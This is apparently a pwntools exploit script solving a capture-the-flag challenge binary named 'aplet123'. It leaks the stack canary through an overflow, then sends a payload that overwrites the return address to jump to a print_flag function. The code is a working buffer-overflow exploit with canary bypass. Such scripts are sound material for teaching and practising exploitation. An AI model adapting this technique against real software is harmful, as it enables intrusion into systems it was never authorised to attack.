#!/usr/bin/env python3

from pwn import *

exe = ELF("./aplet123")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.lac.tf", 31123)

    return r


def leak_canary() -> int:
    payload = b"A" * 69 + b"i'm"
    r.sendlineafter(b'hello', payload)

    return int.from_bytes(b"\x00" + r.recvlines(2)[-1][3:10], "little")



def main():
    r = conn()

    print_flag = 0x00000000004011e6
    canary = leak_canary()

    payload = b"bye\x00" + b"A" * 68 + p64(canary) + b"B" * 8 + p64(print_flag)
    r.sendline(payload)
    
    r.interactive('$ ')


if __name__ == "__main__":
    main()
